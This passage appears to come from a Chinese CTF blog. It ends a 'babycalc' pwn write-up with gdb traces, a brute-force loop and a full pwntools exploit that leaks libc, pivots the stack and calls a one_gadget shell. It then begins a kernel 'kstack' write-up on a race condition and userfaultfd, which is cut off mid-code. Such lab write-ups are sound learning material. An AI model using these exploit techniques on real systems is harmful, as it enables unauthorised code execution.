<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line">#<span class="number">0</span>  <span class="number">0x0000000000400ba6</span> in ?? ()</span><br><span class="line">#<span class="number">1</span>  <span class="number">0x0000000000400c18</span> in ?? ()</span><br><span class="line">Backtrace stopped: <span class="function">previous frame inner to <span class="keyword">this</span> <span class="title">frame</span> <span class="params">(corrupt <span class="built_in">stack</span>?)</span></span></span><br><span class="line"><span class="function">pwndbg&gt; telescope 0x0000000000400c18</span></span><br><span class="line"><span class="function">00:0000│  0x400c18 ◂— leave  </span></span><br><span class="line"><span class="function">01:0008│  0x400c20 ◂— add    byte ptr [rax], al</span></span><br><span class="line"><span class="function">02:0010│  0x400c28 ◂— mov    eax, 0</span></span><br><span class="line"><span class="function">03:0018│  0x400c30 ◂— 0xe800000000b8ffff</span></span><br></pre></td></tr></table></figure>
<ul>
<li>通过覆盖返回地址低位就可以构造出两个 <code>leave ret</code>，然后打栈迁移</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x400bb7</span>    leave  </span><br><span class="line">  <span class="number">0x400bb8</span>    ret    </span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0x400c18</span>    leave  </span><br><span class="line">  <span class="number">0x400c19</span>    ret  </span><br></pre></td></tr></table></figure>
<p>这里的栈迁移比较靠运气，核心点就是利用程序的置空操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf[(<span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL)] = <span class="number">0</span>; </span><br></pre></td></tr></table></figure>
<p>利用这一点可以把栈上存储的 RBP 末尾给置空，从而可以把 RSP 迁移到某个末尾为 <code>\x00</code> 的栈地址上，如果这里刚好是 ROP 链就可以劫持程序流（但栈的随机化程度大，恰好命中的可能比较小）</p>
<p>下面展示一个成功的案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RBP  <span class="number">0x7ffd50a0aab0</span> —▸ <span class="number">0x7ffd50a0aa00</span> ◂— <span class="number">0x1</span></span><br><span class="line">RSP  <span class="number">0x7ffd50a0a9b0</span> ◂— <span class="number">0x6161616161613432</span> (<span class="string">&#x27;24aaaaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffd50a0aa00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffd50a0aa00</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffd50a0aa08</span> —▸ <span class="number">0x400ca3</span> ◂— pop    rdi</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffd50a0aa10</span> —▸ <span class="number">0x602018</span> (<span class="built_in">puts</span>@got.plt) —▸ <span class="number">0x7f1af8eb96a0</span> (<span class="built_in">puts</span>) ◂— push   r12</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffd50a0aa18</span> —▸ <span class="number">0x602018</span> (<span class="built_in">puts</span>@got.plt) —▸ <span class="number">0x7f1af8eb96a0</span> (<span class="built_in">puts</span>) ◂— push   r12</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x400c18</span>    leave  </span><br><span class="line">► <span class="number">0x400c19</span>    ret    &lt;<span class="number">0x400ca3</span>&gt;</span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0x400ca3</span>    pop    rdi</span><br><span class="line">  <span class="number">0x400ca4</span>    ret    </span><br></pre></td></tr></table></figure>
<p>爆破脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        success(<span class="string">&quot;&gt;&gt; testing&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">v3 = [<span class="number">19</span>, <span class="number">36</span>, <span class="number">53</span>, <span class="number">70</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">17</span>, <span class="number">161</span>, <span class="number">50</span>, <span class="number">131</span>, <span class="number">212</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">199</span>, <span class="number">24</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ca3</span></span><br><span class="line">puts_got = <span class="number">0x602018</span></span><br><span class="line">puts_plt = <span class="number">0x4005d0</span></span><br><span class="line"></span><br><span class="line">code = p64(<span class="number">1</span>)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">payload = <span class="string">&#x27;24&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">2</span>)+code.ljust(<span class="number">0x60</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">payload += p8(v3[<span class="number">0</span>])+p8(v3[<span class="number">1</span>])+p8(v3[<span class="number">2</span>])+p8(v3[<span class="number">3</span>])+p8(v3[<span class="number">4</span>])+p8(v3[<span class="number">5</span>])+p8(v3[<span class="number">6</span>])+p8(v3[<span class="number">7</span>])+p8(v3[<span class="number">8</span>])+p8(v3[<span class="number">9</span>])+p8(v3[<span class="number">10</span>])+p8(v3[<span class="number">11</span>])+p8(v3[<span class="number">12</span>])+p8(v3[<span class="number">13</span>])+p8(v3[<span class="number">14</span>])+p8(v3[<span class="number">15</span>])</span><br><span class="line">payload += <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(<span class="number">0x38</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;number-1:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;good done\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_libc = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(puts_libc))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>拿到远程 puts 地址后，可以到如下网站中查看 libc 版本：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=puts%3A6a0">libc database search (blukat.me)</a> </li>
</ul>
<p><img src="/2023/02/05/%E6%A0%88%E8%BF%81%E7%A7%BB+%E7%88%86%E7%A0%B4/1675319907757.png" alt="1675319907757"> </p>
<ul>
<li>最后确定 <code>libc6_2.23-0ubuntu11.3_amd64</code></li>
</ul>
<p>在 ROP 链的末尾写上程序某个地方的地址，就可以实现循环，常用的地址有3处：</p>
<ul>
<li><code>main</code>：主函数</li>
<li><code>pwn</code>：存在漏洞的函数</li>
<li><code>start</code>：程序的入口函数</li>
</ul>
<p>经过调试发现前两个函数都不适合进行循环，只有在 ROP 链末端写入 <code>start</code> 才有可能 <code>get shell</code>（其实是试出来的）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./babycalc&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">csu_front_addr=<span class="number">0x400C80</span></span><br><span class="line">csu_end_addr=<span class="number">0x400C9A</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    local = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        p = process(challenge)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;tcp.cloud.dasctf.com&#x27;</span>, <span class="string">&#x27;22084&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">        gdb.attach(p,<span class="string">&quot;b*0x4007F0\n b*0x400BA6\n b*0x40079B\n&quot;</span>)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">    v3 = [<span class="number">19</span>, <span class="number">36</span>, <span class="number">53</span>, <span class="number">70</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">17</span>, <span class="number">161</span>, <span class="number">50</span>, <span class="number">131</span>, <span class="number">212</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">199</span>, <span class="number">24</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = <span class="number">0x0000000000400ca3</span></span><br><span class="line">    pop_rsi_ret = <span class="number">0x0000000000400ca1</span></span><br><span class="line">    puts_got = <span class="number">0x602018</span></span><br><span class="line">    puts_plt = <span class="number">0x4005d0</span></span><br><span class="line">    read_plt = <span class="number">0x4005F0</span></span><br><span class="line">    main_addr = <span class="number">0x400C1A</span></span><br><span class="line">    pwn_addr = <span class="number">0x400789</span></span><br><span class="line">    start_addr = <span class="number">0x400650</span></span><br><span class="line"></span><br><span class="line">    code = p64(<span class="number">1</span>)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">    payload = <span class="string">&#x27;24&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">2</span>)+code.ljust(<span class="number">0x60</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">    payload += p8(v3[<span class="number">0</span>])+p8(v3[<span class="number">1</span>])+p8(v3[<span class="number">2</span>])+p8(v3[<span class="number">3</span>])+p8(v3[<span class="number">4</span>])+p8(v3[<span class="number">5</span>])+p8(v3[<span class="number">6</span>])+p8(v3[<span class="number">7</span>])+p8(v3[<span class="number">8</span>])+p8(v3[<span class="number">9</span>])+p8(v3[<span class="number">10</span>])+p8(v3[<span class="number">11</span>])+p8(v3[<span class="number">12</span>])+p8(v3[<span class="number">13</span>])+p8(v3[<span class="number">14</span>])+p8(v3[<span class="number">15</span>])</span><br><span class="line">    payload += <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(<span class="number">0x38</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;number-1:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;good done\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    puts_libc = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = puts_libc - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    success(<span class="string">&quot;puts_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(puts_libc))</span><br><span class="line">    success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    debug()</span><br><span class="line"></span><br><span class="line">    system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="number">0x18ce57</span></span><br><span class="line"></span><br><span class="line">    one_gadgets = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">    one_gadget = one_gadgets[<span class="number">3</span>]+libc_base</span><br><span class="line"></span><br><span class="line">    success(<span class="string">&quot;system_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line">    success(<span class="string">&quot;binsh_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">&#x27;24&#x27;</span>+<span class="string">&#x27;d&#x27;</span>*(<span class="number">0x70</span>-<span class="number">2</span>)+<span class="number">0x58</span>*<span class="string">&quot;e&quot;</span>+p64(one_gadget)</span><br><span class="line">    payload += p8(v3[<span class="number">0</span>])+p8(v3[<span class="number">1</span>])+p8(v3[<span class="number">2</span>])+p8(v3[<span class="number">3</span>])+p8(v3[<span class="number">4</span>])+p8(v3[<span class="number">5</span>])+p8(v3[<span class="number">6</span>])+p8(v3[<span class="number">7</span>])+p8(v3[<span class="number">8</span>])+p8(v3[<span class="number">9</span>])+p8(v3[<span class="number">10</span>])+p8(v3[<span class="number">11</span>])+p8(v3[<span class="number">12</span>])+p8(v3[<span class="number">13</span>])+p8(v3[<span class="number">14</span>])+p8(v3[<span class="number">15</span>])</span><br><span class="line">    payload += <span class="string">&#x27;f&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(<span class="number">0x38</span>) </span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">&quot;number-1:&quot;</span>,payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        success(<span class="string">&quot;&gt;&gt; testing&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/01/userfaultfd+setxattr+pt_regs/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/01/userfaultfd+setxattr+pt_regs/" class="post-title-link" itemprop="url">userfaultfd+setxattr+pt_regs</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-01 11:41:28 / Modified: 11:44:48" itemprop="dateCreated datePublished" datetime="2023-02-01T11:41:28+08:00">2023-02-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>kstack 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet&quot; \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -net user -net nic -device e1000 \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
<ul>
<li>kaslr，smep</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">ifup eth0 &gt;/dev/null 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">echo 2 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">insmod /root/kstack.ko</span><br><span class="line">chmod 777 /proc/stack</span><br><span class="line"></span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">cat /root/banner</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>
<ul>
<li>kptr_restrict，dmesg_restrict</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></figure>
<ul>
<li>PTI</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pid = *(_DWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">0x35C</span>);</span><br><span class="line"><span class="keyword">if</span> ( cmd == <span class="number">0x57AC0001</span> )                      <span class="comment">// PUSH</span></span><br><span class="line">&#123;</span><br><span class="line">  buf = (Element *)kmem_cache_alloc(kmalloc_caches[<span class="number">5</span>], <span class="number">0x6000C0</span>LL);</span><br><span class="line">  LODWORD(buf-&gt;pid) = pid;</span><br><span class="line">  ptr = head;</span><br><span class="line">  head = buf; <span class="comment">/* 更新头节点 */</span></span><br><span class="line">  buf-&gt;ptr = ptr; <span class="comment">/* 把原来的头节点挂载到新头节点的后面 */</span></span><br><span class="line">  <span class="keyword">if</span> ( !copy_from_user(&amp;buf-&gt;value, arg, <span class="number">8LL</span>) ) <span class="comment">/* 拷贝数据到新头节点 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  head = buf-&gt;ptr; <span class="comment">/* 拷贝失败则重置头节点 */</span></span><br><span class="line">  kfree(buf);                               </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>单向链表插头</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cmd != <span class="number">0x57AC0002</span> )                    <span class="comment">// POP</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    ptr = head;</span><br><span class="line">    <span class="keyword">if</span> ( !head )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( pid == LODWORD(head-&gt;pid) ) <span class="comment">/* 匹配对应线程组的节点 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !copy_to_user(arg, &amp;head-&gt;value, <span class="number">8LL</span>) ) <span class="comment">/* 把数据拷贝到用户态 */</span></span><br><span class="line">      &#123;</span><br><span class="line">        head = ptr-&gt;ptr;</span><br><span class="line">        <span class="keyword">goto</span> EINVAL;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ptr = head-&gt;ptr;</span><br><span class="line">      <span class="keyword">if</span> ( ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( LODWORD(ptr-&gt;pid) != pid ) <span class="comment">/* 遍历所有线程组,直到匹配节点 */</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !ptr-&gt;ptr )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">          ptr = ptr-&gt;ptr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !copy_to_user(arg, &amp;ptr-&gt;value, <span class="number">8LL</span>) ) <span class="comment">/* 把数据拷贝到用户态 */</span></span><br><span class="line">        &#123;</span><br><span class="line">          ptr-&gt;ptr = ptr-&gt;ptr;</span><br><span class="line">EINVAL:</span><br><span class="line">          kfree(ptr);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>单向链表脱去头节点</li>
</ul>
<p>本题目涉及多线程，但没有加锁，有条件竞争漏洞</p>
<p><strong>userfaultfd</strong></p>
<p>userfaultfd 是 Linux 的一个系统调用，使用户可以通过自定义的页处理程序 page fault handler 在用户态处理缺页异常</p>
<p>先看一个注册 userfaultfd 的案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">long</span> uffd = syscall(__NR_userfaultfd, 